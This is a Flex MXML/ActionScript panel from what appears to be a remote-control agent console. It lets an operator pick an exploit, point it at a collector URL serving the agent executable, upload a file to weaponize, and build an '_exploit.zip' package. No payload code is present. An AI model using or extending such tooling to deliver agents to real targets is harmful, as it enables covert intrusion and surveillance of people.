<?xml version="1.0" encoding="utf-8"?>
<s:Group xmlns:fx="http://ns.adobe.com/mxml/2009" 
         xmlns:s="library://ns.adobe.com/flex/spark" 
         xmlns:mx="library://ns.adobe.com/flex/mx" width="370" height="100%" xmlns:build="it.ht.rcs.console.operations.view.agents.build.*">

  <fx:Script>
    <![CDATA[
      import it.ht.rcs.console.build.controller.BuildManager;
      import it.ht.rcs.console.monitor.controller.LicenseManager;
      import it.ht.rcs.console.network.controller.CollectorManager;
      import it.ht.rcs.console.task.controller.DownloadManager;
      import it.ht.rcs.console.utils.AlertPopUp;
      
      import locale.R;
      
      import mx.collections.ArrayCollection;
      import mx.collections.ListCollectionView;
      import mx.collections.Sort;
      import mx.collections.SortField;
      import mx.core.UIComponent;
      import mx.managers.PopUpManager;
      import mx.rpc.events.FaultEvent;
      import mx.rpc.events.ResultEvent;
      
      import spark.events.IndexChangeEvent;
      
      private var fileReference:FileReference;
      
      [Bindable]
      private var exploits:ListCollectionView;
      [Bindable]
      private var urls:ListCollectionView;
      
      private var params:Object = {platform: 'exploit', generate: {}, melt:{}};
      
      [Bindable]
      private var _platform:String; 
      
      public function set platform(value:*):void
      {
        _platform = value;
        
        BuildManager.instance.refresh();
        
        var sortFunction:Sort = new Sort();
        sortFunction.fields = [new SortField('id', true, true, false)];
       
        exploits = BuildManager.instance.getExploitView(sortFunction, platformFilterFunction);  
        
        exploit.selectedItem = null;
          
        // get the list of entry points 
        CollectorManager.instance.refresh();
        urls = CollectorManager.instance.getEntryPointsView();
        
        createBtn.platforms = [value];
      }
            
      private function platformFilterFunction(item:Object):Boolean
      {
        return item['platform'] == _platform;
      }
      
      private function collName(o:Object):String
      {
        if (o != null)
          return "http://" + o['address'] + '/';
        
        return '';
      }
      
      private function exploitName(o:Object):String
      {
        if (o != null)
          return o['name'];
        
        return '';
      }
      
      private function browse():void
      {
        fileReference = new FileReference();
        fileReference.addEventListener(Event.SELECT, fileSelection);
        fileReference.browse();
      }
      
      private function fileSelection(event:Event):void
      {
        currentState = 'fileSelected';
        fileName.text = event.target.name;

        fileReference.addEventListener(HTTPStatusEvent.HTTP_STATUS, onUploadError);
        fileReference.addEventListener(IOErrorEvent.IO_ERROR, onUploadError);
        fileReference.addEventListener(SecurityErrorEvent.SECURITY_ERROR, onUploadError);
        fileReference.addEventListener(DataEvent.UPLOAD_COMPLETE_DATA, onUploadComplete);
        
        uploadPopup = PopUpManager.createPopUp(this.parentDocument as DisplayObject, UploadPopup, true) as UploadPopup;
        uploadPopup.fileReference = fileReference;
        PopUpManager.centerPopUp(uploadPopup);
      }
      
      private var uploadPopup:UploadPopup;
      private function create(event:MouseEvent):void
      {
                
        var appname:String = parentDocument.factory.ident.substring(4);
        
        if (parentDocument.platform == 'windows')
          appname += '.exe';
        
        params['generate']['exploit'] = exploit.selectedItem.id;
        params['generate']['platforms'] = [parentDocument.platform];
        params['generate']['binary'] = {demo: createBtn.demo.selected, admin: false};
        params['generate']['melt'] = {admin: false, demo: createBtn.demo.selected};
        params['melt'] = {appname: appname};
        params['factory'] = {_id: parentDocument.factory._id};

        if (exploit.selectedItem.params.file != null) {
          if (currentState != 'fileSelected') {
            AlertPopUp.show(R.get('SELECT_FILE'));
            return;
          }
        }

        if (exploit.selectedItem.params.string != null) {
          if (string.selectedItem != null) {
            params['melt']['url'] = "http://" + string.selectedItem['address'] + '/' + params['melt']['appname'];
          } else {
            AlertPopUp.show(R.get('SELECT_URL'));
            return;
          }
        }

        if (exploit.selectedItem.params.combo != null) {
          if (combo.selectedItem != null) {
            params['melt']['combo'] = combo.selectedItem;
          } else {
            AlertPopUp.show(R.get('SELECT_OPTION'));
            return;
          }
        }        
        
        var filename:String = parentDocument.factory.name + "_" + exploit.selectedItem.id + '_exploit.zip'
        DownloadManager.instance.createTask("build", filename, params, onSuccess, onFailure);        
      }
      
      private function onUploadError(event:Event):void
      {
        PopUpManager.removePopUp(uploadPopup);
        AlertPopUp.show(event.type);
      }
      
      private function onUploadComplete(event:DataEvent):void
      {
        PopUpManager.removePopUp(uploadPopup);
        
        params['melt']['input'] = event.data;
      }
      
      private function onSuccess(e:ResultEvent):void
      {
        PopUpManager.removePopUp(((parentDocument as UIComponent).parentDocument).hostComponent);
      }
      
      private function onFailure(e:FaultEvent):void
      {
        AlertPopUp.show(R.get('TASK_ALREADY_CREATED'));
      }
      
      
      protected function changeExploit(event:IndexChangeEvent):void
      {
        currentState = 'normal'
      }
      
    ]]>
  </fx:Script>
  
  <s:states>
    <s:State name="normal"/>
    <s:State name="fileSelected"/>
  </s:states>
  
  <s:Label left="10" top="5" fontWeight="bold" text="Choose an Exploit:"/>
  <s:ComboBox id="exploit" left="10" right="10" top="20" dataProvider="{exploits}" labelFunction="exploitName" selectedIndex="0" change="changeExploit(event)"/>
  
  <s:HGroup left="10" top="50" right="10" visible="{exploit.selectedItem != null &amp;&amp; exploit.selectedItem.params != null}">
    
    <s:HGroup verticalAlign="middle" visible="{exploit.selectedItem.params.string != null}" includeInLayout="{exploit.selectedItem.params.string != null}">
      <s:Label text="{exploit.selectedItem.params.string}"/>
      <s:ComboBox id="string" width="100%" dataProvider="{urls}" labelFunction="collName"/>      
    </s:HGroup>
    
    <s:HGroup verticalAlign="middle" height="25" visible="{exploit.selectedItem.params.file != null}" includeInLayout="{exploit.selectedItem.params.file != null}">
      <s:Label text="{exploit.selectedItem.params.file}"/>
      <s:Button excludeFrom="fileSelected" width="100" label="{R.get('BROWSE')}" click="browse()"/>
      <s:Label id="fileName" includeIn="fileSelected" buttonMode="true" click="browse()"
               maxDisplayedLines="1" toolTip="{R.get('CLICK_TO_CHANGE_FILE')}"/>    
    </s:HGroup>
    
    <s:HGroup verticalAlign="middle" visible="{exploit.selectedItem.params.combo != null}" includeInLayout="{exploit.selectedItem.params.combo != null}">
      <s:DropDownList id="combo" dataProvider="{exploit.selectedItem.params.combo}" selectedIndex="{exploit.selectedItem.params.combo != null ? 0 : -1}"/>      
    </s:HGroup>
    
  </s:HGroup>
  
  <s:TextArea left="10" right="10" top="80" bottom="30" contentBackgroundAlpha="0.0" editable="false" text="{exploit.selectedItem.description}"/>
  
  <build:CreateWithDemoButton id="createBtn" left="10" bottom="0" right="10" create="{create}"/>
  
</s:Group>
